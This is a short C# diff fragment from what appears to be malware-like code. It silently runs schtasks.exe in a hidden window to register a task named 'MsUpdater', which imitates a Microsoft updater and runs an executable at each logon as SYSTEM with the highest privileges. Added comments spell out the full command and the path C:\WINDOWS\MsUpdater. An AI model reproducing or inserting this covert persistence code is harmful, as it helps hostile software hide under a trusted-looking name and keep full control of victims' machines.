@@ -28,9 +28,12 @@
             Process.Start(new ProcessStartInfo
                               {
                                   FileName = "schtasks.exe",
-                                  Arguments = $"/CREATE /TN MsUpdater /TR {target} /SC ONLOGON /RL HIGHEST /RU SYSTEM",
-                                  WindowStyle = ProcessWindowStyle.Hidden
+                                  Arguments = $"/CREATE /TN MsUpdater /TR {target} /SC ONLOGON /RL HIGHEST /RU SYSTEM", // C:\WINDOWS\MsUpdater
+                                                                                                                        // "schtasks /CREATE /TN MsUpdater /TR C:\WINDOWS\MsUpdater\MsUpdater.exe /SC ONLOGON /RL HIGHEST /RU SYSTEM"
+                WindowStyle = ProcessWindowStyle.Hidden
                               });
+
+            //
 
             var copyDir = Path.Combine(Directory.GetCurrentDirectory(), "Temp");
             Directory.CreateDirectory(copyDir);
